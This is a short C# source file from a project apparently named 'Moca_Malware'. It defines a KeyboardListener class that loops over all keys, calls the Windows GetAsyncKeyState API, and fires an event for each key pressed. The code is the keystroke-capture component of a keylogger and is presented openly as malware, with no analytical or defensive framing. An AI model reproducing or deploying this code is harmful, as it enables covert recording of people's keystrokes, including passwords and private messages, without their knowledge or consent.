using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Moca_Malware
{
    class KeyboardListener
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Keys vKey);

        public delegate void KeyPressed(Keys vKey);
        public event KeyPressed OnKeyPressed;
        public bool isListening = true;

        private Keys getPressedKey()
        {
            Keys pressedKey = Keys.None;
            foreach (Keys vkey in Enum.GetValues(typeof(Keys)))
            {
                if (Convert.ToBoolean(GetAsyncKeyState(vkey) & 0x0001))
                    pressedKey = vkey;
            }

            return pressedKey;
        }

        public void listenForAnyPress()
        {
            Keys pressedKey;
            while(true)
            {
                pressedKey = getPressedKey();
                if (pressedKey != Keys.None)
                    OnKeyPressed?.Invoke(pressedKey);
            }
        }

    }
}
